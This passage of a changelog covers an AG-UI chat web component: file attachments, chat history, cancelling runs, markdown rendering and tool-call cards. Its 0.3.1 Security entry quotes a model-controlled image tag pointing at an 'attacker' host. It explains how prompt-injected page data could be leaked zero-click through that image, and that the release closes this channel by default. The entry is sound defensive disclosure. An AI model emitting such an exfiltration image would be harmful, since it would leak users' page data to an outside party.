  out-of-band (multipart, with the element's `headers`) into a pending tray —
  one chip per file with a progress bar, settling to `ready` or `error` (with
  retry / remove). On send, the ready files' refs render as read-only chips on
  the user bubble and travel to the agent: the wire stays vanilla AG-UI (only
  lightweight `{ id, name, mime, size }` refs, never bytes), the model learns the
  ids from a one-line run-context manifest, and reads contents server-side via
  the `read_attachment` tool. Refs persist on the message, so a restored
  conversation re-renders its chips.
- **Client-side guards** (instant feedback; the server stays authoritative):
  `data-attachment-accept` (an `<input accept>` list) and
  `data-attachment-max-bytes` (default 10 MiB, `0` disables).
- **Pluggable upload transport.** A new `uploadHandler` property —
  `(file, onProgress) => Promise<AttachmentRef>` — swaps the built-in multipart
  upload for a custom one (a resumable `tus-js-client` adapter, direct-to-S3
  multipart, …) without touching the tray, chips, or AG-UI wire. When set, the
  📎 affordance appears even with no `data-attachments-url`. Defaults to the
  built-in `uploadAttachment`.
- **New exports:** `uploadAttachment` + `UploadOptions` + `UploadHandler`, the
  `AttachmentRef` type, and `messageAttachments`. `AgUiClient.send` gains an
  optional second `attachments` argument; the `ag-ui-submit` event `detail` now
  also carries `attachments`.

## [0.5.0] — 2026-06-24

### Added

- **Chat-history drawer.** A history toggle (☰) in the header opens a slide-over
  listing the user's past conversations (title · relative time · preview), with
  select, new chat, inline rename, and delete-with-confirm. The
  `ClientConversationStore` interface gains `listThreads` / `setActiveThread` /
  `renameThread` and a `ThreadMeta` row shape; the default `SessionStorageStore`
  now keeps a per-tab thread index so the drawer works with no server. Selecting
  a row switches the active conversation and replays its history. The drawer is a
  slide-over by default, with an inline side-panel variant for
  `placement="embedded"`.
- **Server-backed history via `data-threads-url`.** Set the attribute (to
  django-ag-ui's `ThreadsView` URL) and the drawer routes list / load / rename /
  delete through that endpoint via a new `RemoteConversationStore`, showing
  durable, cross-device threads. The client store remains the offline fallback;
  rename / delete apply optimistically.

## [0.4.0] — 2026-06-12

### Added

- **Cancel / stop a run.** `AgUiClient.cancel()` aborts the in-flight
  streaming request (`abortRun()` — AG-UI's transport-level cancel; the
  server observes the disconnect) and stops the multi-round run loop: tool
  calls collected before the abort are not executed and no further round
  starts (a frontend tool handler already running completes, but its result
  doesn't trigger a re-run). Safe no-op with no run in flight.
- **`onCancelled()` handler** on `AgUiClientHandlers` — the deliberate-stop
  sibling of `onError`. Partial assistant text stays in the transcript and
  is persisted (`onPersist`), so a reload shows the truncated exchange;
  `onSettled` still fires (terminal-rest guarantee). Both the
  abort-resolves and abort-rejects behaviours of `@ag-ui/client` are
  handled (its `runAgent` filters `AbortError` and resolves normally;
  re-throwing versions are caught via the error's name).
- **The Send button becomes Stop while a run is in flight** — same button,
  label + `aria-label` swap, `data-state="running"` for styling — through
  the whole interaction including between tool rounds. **Escape** in the
  composer also cancels (only when the skills palette is closed; the
  palette keeps its own Escape). After a cancel the transcript gets a muted
  **"⏹ Stopped"** note (`.stopped-note`), not an error bubble.
- **Cancelling declines an open confirmation card.**
  `requestConfirmation` accepts `ConfirmationOptions` with an
  `AbortSignal`; aborting resolves the pending decision as declined
  (`data-resolved="declined"`). A decision already made wins over a late
  abort.

### Changed

- `newChat()` now cancels any in-flight run before discarding the client —
  previously the old agent kept streaming into a cleared transcript.
- The Send button is no longer `disabled` during a run (it's the Stop
  control now); `AgUiClientHandlers.onCancelled` is required, so hosts
  implementing the handlers interface must add it.

## [0.3.1] — 2026-06-10

### Security

- **`<img>` is stripped from rendered assistant markdown by default.** A
  model-controlled `<img src="https://attacker/?d=...">` is fetched by the
  browser with no user interaction, which made the sanitizer allowlist a
  zero-click exfiltration channel for prompt-injected page data (page maps,
  state hooks, tool results). Hosts that trust their content can opt back in
  via the new `allowImages` element property (or `renderMarkdown(text,
  { allowImages: true })`); when enabled, DOMPurify still strips event
  handlers and `javascript:` URLs as before.

### Fixed

- **Rotated headers now reach the agent stream.** `HttpAgent` is built once
  per conversation with the headers baked into its constructor, so a rotated
  token (CSRF, short-lived JWT) never reached the agent endpoint and long
  sessions 401'd mid-conversation — even though the skills/tools catalog
  fetches already re-read `headers` per request. The element now passes a
  live `getHeaders` callback to the agent factory and `createHttpAgent`'s
  fetch wrapper overlays the fresh values on every request. Custom
  `agentFactory` implementations can read the new optional
  `HttpAgentOptions.getHeaders` to do the same.
- **Removed the phantom `./style.css` export.** `package.json` advertised
  `@artooi/ag-ui-web-component/style.css` → `dist/ag-ui-web-component.bundle.css`,
  but the build emits no CSS file (styles live as JS strings and are injected
  into the Shadow DOM), so importing the advertised path always failed.
- **The shared `marked` singleton is no longer mutated.** Module-scope
  `marked.setOptions({ gfm, breaks })` clobbered a host app's `marked`
  configuration whenever the dependency was deduped. Rendering now uses a
  local `Marked` instance; the global keeps its defaults.

### Added

- **Auto-prettified tool-card labels.** When no label is found anywhere in
  the chain (`x-summary` → `toolSummaries` → fetched `data-tools-url`
  catalog), cards now fall back to a prettified name (`list_projects` →
  "List projects") instead of the raw identifier. Exported as
  `prettifyToolName`.

## [0.3.0] — 2026-06-03

### Added
- **`data-tools-url` — server tool-label catalog.** On connect the element
  fetches a JSON catalog (`[{ name, summary, description? }]`) from the URL
  (with `headers`) and uses it to label tool-call cards for **server-side tools**
  whose schema never reaches the browser. Pairs with django-ag-ui's `tools/`
  endpoint, so a tool's label flows from its server-side source (drf-mcp
  `display_name`, `@tool(summary=…)`) with no per-tool client duplication.
  Per-card label precedence: the tool's own `x-summary` → an explicit
  `toolSummaries` entry → the fetched catalog → the raw name. Exports the
  `ToolCatalogEntry` type and the `parseToolCatalog` helper.

## [0.2.2] — 2026-06-02

### Added
- **Friendly tool-call card labels.** The built-in tools now carry `x-summary`
  labels (`navigate_to_route` → "Navigate", `list_routes` → "List pages",
  `read_page` → "Read the page", state-hook `read_*`/`set_*` → "Read/Update
  <name>"). For tools whose schema never reaches the browser — **server-side
  tools** (drf-mcp, `@tool` registry) — a new `toolSummaries: Record<string,
  string>` property maps tool name → label as a fallback (e.g.
  `chat.toolSummaries = { list_projects: "Search projects" }`).

### Changed
- A tool call that ends with **no client handler and no `TOOL_CALL_RESULT`** now
  settles the card as **"No result returned."** instead of the misleading
  "Executed on the server." (nothing executed it).

### Fixed
- **Incoming-text animations no longer double-fire.** Two distinct cases:
  - *End of stream:* `data-text-animation="word"` wrapped the finished assistant
    message into staggered `.word` spans on `TEXT_MESSAGE_END`, so a response
    that had already streamed in re-animated itself one word at a time. The word
    reveal now runs only when a message arrives **at once** (single text delta,
    or an error bubble); a message streamed across multiple deltas keeps its
    progressive reveal and isn't re-wrapped.
  - *Reload from memory:* on rehydrate the whole transcript mounts at once, so
    every restored assistant bubble animated its text in parallel (fade) or
    re-wrapped word-by-word — wrong, since it's old content, not arriving. Restored
    bubbles are now marked `message--restored`, excluded from the fade entrance
    animation and never word-wrapped, so history appears statically.

## [0.2.1] — 2026-06-02

### Added
- **Server-side tool results in the card.** The element now subscribes to
  AG-UI's `TOOL_CALL_RESULT` event and settles the matching tool-call card with
  the real server output (honouring the `data-tool-display` mode), instead of
  the generic "Executed on the server." placeholder — which remains only as a
  fallback when no result event is streamed.
- **Tool calls and results survive a page refresh.** History replay now
  reconstructs tool-call cards (from assistant `toolCalls`) and settles them
  from the persisted `tool` result messages, so a rehydrated transcript shows
  the full tool activity, not just the prose. Applies to every conversation
  store (the data was already persisted; only the replay was incomplete).

### Fixed
- **Pending indicator could hang after a server-only round.** A round whose
  tool calls were all server-side re-showed the "thinking" indicator after the
  run had already finished, leaving it stuck. The indicator is no longer shown
  speculatively for server tools, and a terminal `onSettled` guarantee clears
  it (and re-enables input) on every run-loop exit — including the
  `MAX_TOOL_ROUNDS` ceiling and errors.

## [0.2.0] — 2026-06-02

### Added
- **Markdown + HTML rendering** in assistant message bubbles (`renderMarkdown`),
  sanitised with DOMPurify (scripts, event handlers, and `javascript:` URLs
  stripped; links hardened with `target`/`rel`). User messages stay literal.
- **Pending indicator** — an animated "thinking" indicator shown while the agent
  is awaited (before the first token and between tool rounds), honouring
  `prefers-reduced-motion`.
- **New-chat button** in the header — clears the transcript, the persisted
  conversation, and the in-memory run state, and mints a fresh thread.
- **Collapse seam** — a reflected `collapsed` attribute, a built-in header
  toggle, a persisted (per-tab) collapsed state, and a `TOGGLE_EVENT`
  (`ag-ui-toggle`) so a host can drive its own chrome.
- **Tool-call display modes** (`TOOL_DISPLAY`, `data-tool-display`): `minimal`
  (name + status), `compact` (args + result behind one "Details" toggle), and
  `full` (the default; original behaviour).
- **Richer action animations**: `pressThenClick`, `selectOption`,
  `toggleControl` (+ `pressButton` / `selectControl` / `toggleCheckbox` driver
  wrappers), all honouring `prefers-reduced-motion`.
- **Dynamic route syntax**: `Route.path` supports `:name` placeholders;
  `navigate_to_route` substitutes path params (leftover params → query string)
  and `list_routes` advertises each route's `pathParams`.
- `X_CONFIRM_KEY` (`x-confirm`) tool metadata for a human-readable confirmation
  prompt.
- `setNativeValue` / `setNativeChecked` utilities (also used internally).
- **Theming** — a `theme` attribute (`light` / `dark` / `auto` / `code`); `auto`
  follows `prefers-color-scheme`, `code` is a monospace terminal palette. Plus a
  wider set of themeable `--ag-ui-*` variables.
- **Density + placement presets** — `density` (`comfortable` / `compact`) and
  `placement` (`bottom-left` / `side` / `full` / `embedded`); `embedded` drops
  the floating chrome and high z-index so the widget lives in the host layout.
- **Incoming-text animations** — `data-text-animation` (`none` / `fade` /
  `word`), the last revealing assistant text word-by-word; honours
  `prefers-reduced-motion`.
- **`confirmPredicate`** — a per-call `(toolName, args) => boolean | Promise`
  hook deciding confirmation dynamically (authoritative over `x-destructive`).
- **Built-in `read_page` tool** — present when a `getPageMap` provider is set, so
  the agent can re-read the page mid-turn after acting.
- **`x-summary`** tool metadata (`X_SUMMARY_KEY`) — a friendly label shown on the
  tool-call card instead of the raw tool name.
- `observedAttributes` / `attributeChangedCallback` so a late `title-text`
  change updates the header.
- Accessibility: `role="log"`/`aria-live` on the transcript, `role="status"` on
  the pending indicator, `role="group"` on the confirmation card, input label.
- **Skills** — pre-defined prompts surfaced as **chips** (`data-prompt-chips`)
  and/or a **`/`-command palette** (`data-slash-commands`), both opt-in over one
  catalog. Catalog from the `skills` setter (`setSkills`), a `data-skills` JSON
  embed, and/or a fetched `data-skills-url` (merged backend → embed → client).
  Picking pre-fills the input (or auto-sends with `sendImmediately`); prompts
  support `{placeholder}`s filled from `skillContext`, with a missing value
  blocking the send and showing a hint. Exports the `Skill` type.

### Changed
- The destructive-action confirmation is now an **inline card in the transcript**
  (Confirm / Cancel, with the `x-confirm` message) instead of a focus-stealing
  modal overlay. `requestConfirmation` now renders inline; the
  `confirmation_modal` module was removed.
- **Framework-controlled inputs now work.** `fillField` / `typeInto` /
  `selectOption` / `toggleControl` / `setControlValue` set `value` / `checked`
  through the **native prototype setter** before dispatching `input`, so
  React/Vue/Svelte value-tracking sees the change (previously the field looked
  filled but host state stayed empty).
- **Framework interop:** reflecting **property setters** for `endpoint`,
  `toolDisplay`, and `collapsed` (React 19 assigns matching props as element
  properties — getter-only props previously threw).
- `registerTool` is now **idempotent** — re-registering a tool name replaces it
  instead of throwing (re-fired refs / React StrictMode).

### Fixed
- The Markdown/HTML allowlist now permits sanitised **`<img>`** (safe-scheme
  `src`, no event handlers); `javascript:` srcs and disallowed tags (e.g.
  `iframe`) are still stripped.

## [0.1.1] — 2026-06-01

### Changed
- CI: resolve the pnpm version from `package.json`'s `packageManager` only
  (dropped the conflicting `version` input in the release/test workflows).

### Notes
- First fully-automated release via the npm OIDC publish pipeline — 0.1.0 was
  the manual bootstrap publish that created the package.

## [0.1.0] — 2026-06-01

### Added
- `<ag-ui-chat>` Web Component over AG-UI: Shadow-DOM chat UI, a pluggable tool
  registry (`registerTool`), the `x-destructive` confirmation modal, and the
  DOM-driver + animation primitives.
- Durable conversation + resumable run loop that survives the full page reloads
  of a multi-page app: `SessionStorageStore`, a persisted thread id, and
  `x-navigates` checkpoints completed via `navigationResult` on the next mount.
- Host seams: `routeMap` (+ `list_routes` / `navigate_to_route`), an
  auto-injected `getPageMap` context, `registerStateHook`, and an optional
  client-side `navigate()` callback (SPA vs MPA).

### Notes
- First release — exercising the automated npm OIDC publish pipeline end-to-end.

[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.20.0...HEAD
[0.20.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.19.0...v0.20.0
[0.19.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.18.0...v0.19.0
[0.18.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.17.0...v0.18.0
[0.17.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.16.0...v0.17.0
[0.16.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.15.0...v0.16.0
[0.15.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.1...v0.15.0
[0.14.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.0...v0.14.1
[0.14.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.13.0...v0.14.0
[0.13.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.12.0...v0.13.0
[0.12.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.11.0...v0.12.0
[0.11.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.10.0...v0.11.0
[0.10.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.9.0...v0.10.0
[0.9.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.1...v0.9.0
[0.8.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.0...v0.8.1
[0.8.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.7.0...v0.8.0
[0.7.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.6.0...v0.7.0
[0.6.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.5.0...v0.6.0
[0.5.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.1...v0.4.0
[0.3.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.2...v0.3.0
[0.2.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/Artui/ag-ui-web-component/releases/tag/v0.1.0
